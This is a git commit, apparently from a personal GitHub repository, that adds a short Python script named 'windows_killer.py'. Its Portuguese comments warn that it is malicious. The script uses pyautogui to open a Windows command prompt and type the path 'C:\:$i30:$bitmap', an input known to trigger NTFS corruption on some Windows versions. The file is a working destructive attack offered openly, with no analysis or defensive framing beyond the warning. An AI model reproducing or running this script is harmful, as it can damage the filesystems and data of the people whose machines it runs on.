0e24ec7a03fc536438c98b9bb701c765d07edc7a
Daniel Hacker TV <69324930+danielkalilinux@users.noreply.github.com>
2021-01-29 15:04:45 -0400

    Create windows_killer.py

---
+++ windows_killer.py
@@ -0,0 +1,17 @@
+# windows
+# atenção esse comando e malicioso entao nao execute de estiver em windows.
+import pyautogui
+import time
+
+pyautogui.hotkey('win', 'r')
+pyautogui.write('CMD')
+
+pyautogui.press('enter')
+time.sleep(1)
+
+pyautogui.write('color a')
+time.sleep(1)
+# aqui é unde tudo acontece.
+pyautogui.write('C:\:$i30:$bitmap')
+
+pyautogui.press('enter')
